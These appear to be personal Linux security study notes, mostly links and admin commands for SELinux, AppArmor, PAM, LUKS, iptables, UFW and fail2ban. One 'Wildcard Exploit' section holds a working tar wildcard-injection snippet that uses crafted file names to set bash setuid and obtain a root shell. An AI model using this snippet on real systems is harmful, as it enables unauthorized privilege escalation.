# Host Security
- https://www.open-scap.org/getting-started/

# Live OS
- https://tails.boum.org/

# Partitions
- https://www.landoflinux.com/linux_procfs_sysfs.html

Commands:
- `df -ahT`
- `fdisk -l`
- `man proc`

Modern Linux distributions include a `/sys` directory as a virtual filesystem (_sysfs_, comparable to `/proc`, which is a _procfs_), which stores and allows modification of the devices connected to the system, whereas many traditional UNIX and Unix-like operating systems use `/sys` as a symbolic link to the kernel source tree.

sysfs is a ram-based filesystem, it provides a means to export kernel data structures, their attributes, and the linkages between them to userspace.

#### Proc
-   **/proc/cpuinfo** : **CPU** Information
-   **/proc/filesystems** : File-system **Information** being used currently.
-   **/proc/interrupts** : Information about the current **interrupts** being utilised currently.
-   **/proc/ioports** : Contains all the **Input**/**Output** addresses used by devices on the server.
-   **/proc/meminfo** : **Memory Usages** Information.
-   **/proc/modules** : Currently using **kernel** module.
-   **/proc/mount** : Mounted **File-system** Information.
-   **/proc/stat** : Detailed **Statistics** of the current System.
-   **/proc/swaps** : **Swap** File Information.

# Mandatory Access Control (MAC)
Discretionary Access Control (DAC) - With DAC, files and processes have owners. You can have the user own a file, a group own a file, or other, which can be anyone else. Users have the ability to change permissions on their own files.

But on MAC systems like SELinux, there is administratively set policy around access. Even if the DAC settings on your home directory are changed, an SELinux policy in place to prevent another user or process from accessing the directory will keep the system safe. 

- SELinux = Redhat Based
- AppArmor = Ubuntu, Debian, Suse

## SELINUX
- https://www.redhat.com/en/topics/linux/what-is-selinux
- https://github.com/SELinuxProject/selinux-notebook
- https://www.thegeekdiary.com/understanding-selinux-policies-in-linux/


## AppArmor
- https://www.howtogeek.com/118222/htg-explains-what-apparmor-is-and-how-it-secures-your-ubuntu-system/
`aa-status`

## ACL
- `getfacl`
- `setfacl`
    - `setfacl -m g:students:rwx file`

# Encryption
- https://wiki.archlinux.org/title/Data-at-rest_encryption#Comparison_table
## LUKS
- https://linuxconfig.org/basic-guide-to-encrypting-linux-partitions-with-luks

# GRUB
- https://www.systranbox.com/what-is-grub-and-why-is-it-important/
- https://www.tecmint.com/password-protect-grub-in-linux/
- https://www.tecmint.com/reset-forgotten-root-password-in-debian/

# PAM
- https://www.redhat.com/sysadmin/pluggable-authentication-modules-pam
- https://cyber.vumetric.com/vulns/linux-pam/linux-pam/
- https://www.tecmint.com/configure-pam-in-centos-ubuntu-linux/
- https://tldp.org/HOWTO/User-Authentication-HOWTO/x115.html
- https://www.techradar.com/how-to/how-to-add-two-factor-authentication-to-linux-with-google-authenticator

# Wildcard Exploit
- https://www.davila.me/menu/vulnerability-methods/wildcard-injection
- https://betterprogramming.pub/becoming-root-with-wildcard-injections-on-linux-2dc94032abeb
```sh
echo "chmod +s /bin/bash" > exploit.sh
touch ./"--checkpoint=1"
touch ./"--checkpoint-action=exec=bash exploit.sh"

# remove comment in root crontab
bash -p
whoami
```

# Security Tools
- https://www.cvedetails.com/
- https://github.com/DominicBreuker/pspy
- https://pentestmonkey.net/tools/audit/unix-privesc-check
- https://github.com/rebootuser/LinEnum


# Network Security
# iptables
- https://phoenixnap.com/kb/iptables-tutorial-linux-firewall

Plus:
- Its been around a long time so lots of documentation
- easy to script
- pre-installed on many distros (may be turned off)
- lots of flexability  

Neg:
- ipv6 requires separate rules
- adding new rules requires entire ruleset to be reloaded
- Tables: Join similar actions, can consist of several chains
	- Main
		- Filter - Default (packet filtering)
		- NAT - Nat rules 
		- Mangle - Modify IP headers such as TTL
	- Other
		- Raw - Connection tracking (mark packets)
		- Security - SELinux controls
- Chains: Is a set of rules. Not all chains are available for all tables
	- Pre-Routing - Receiving incoming packet 
	- Input - default policy is accept
	- Forward
	- Output
	- Post-Routing
- Rules: Commands to manipulate network traffic

![](https://doc.callmematthi.eu/pictures/netfilter_chains_horizontal_yed.png)
![](https://i.pinimg.com/originals/e3/7c/f7/e37cf7795695af5ab9f8f4387d557bb7.png)

`sudo iptables -nL`  View Chains  
`sudo iptables -t mangle -L` View with pre/post route  
`sudo iptables -S` List Rules  
`sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT`   
`sudo iptables -L -v --line-numbers` More verbose output  with line numbers  
`sudo iptables -D INPUT  1` Remove the 1st rule  
`sudo iptables -F INPUT`  Flush (delete all rules) in INPUT chain  

- https://sleeplessbeastie.eu/2018/09/10/how-to-make-iptables-configuration-persistent/  

On reboot these changes will not be persistent
Easiest way is to download and run `iptables-persistent`


# firewalld
- https://www.unixmen.com/iptables-vs-firewalld/  

`firewall-cmd --state`  
`firewall-cmd --get-default-zone`  
`firewall-cmd --list-all`  
`sudo firewall-cmd --info-service ssh`  


# UFW
- https://www.digitalocean.com/community/tutorials/ufw-essentials-common-firewall-rules-and-commands  

`sudo ufw status verbose`


## fail2ban
- https://linuxhandbook.com/fail2ban-basic/  

`sudo cp /etc/fail2ban/jail.{conf,local}` Make backup copy to local  
`fail2ban-client -h`  
`fail2ban-client status sshd`   

jail.local
```
[sshd]
enabled   = true
maxretry  = 3
findtime  = 1d
bantime   = 4w
ignoreip  = 127.0.0.1/8 23.34.45.56
```
- Check out https://www.crowdsec.net/

# Logs
- https://www.splunk.com/
- https://www.graylog.org/products/open-source#download-open
- https://www.loggly.com/ultimate-guide/linux-logging-basics/


# Enumeration
Fuzzing to find files directories hidden but accessible.  Can use tools such as DirBuster or nmap scripts.

# SSH Banner
Hide your wives, hide your kids, hide your ssh banners they're hacking everyone up in here.

# Wget
- https://www.hostinger.com/tutorials/wget-command-examples/  

`wget https://raw.githubusercontent.com/nmap/nmap/master/scripts/http-enum.nse`

# Curl
- Book - https://everything.curl.dev/
- https://geekflare.com/curl-command-usage-with-example/  

![Julia Evans Curl Zine](https://jvns.ca/images/curl.jpeg)

```bash
# Get Headers
curl -Is
# Ignore Cert
curl -k
# Follow redirects
curl -L
# Spoof Host Header
curl --verbose --header 'Host: example.com'  192.168.1.10
```

## Download a file
```bash
curl -o nifi-1.9.2.zip http://ftp.wayne.edu/apache/nifi/1.9.2/nifi-1.9.2-source-release.zip
```

# Apache
- https://phoenixnap.com/kb/setup-configure-modsecurity-on-apache  
- https://www.infosecmatter.com/nmap-nse-library/?nse=http-enum
- https://git.mst.edu/slbnmc/ici-wiki/-/wikis/Enumerating-Web-Server-Files-and-Directories-with-DirBuster
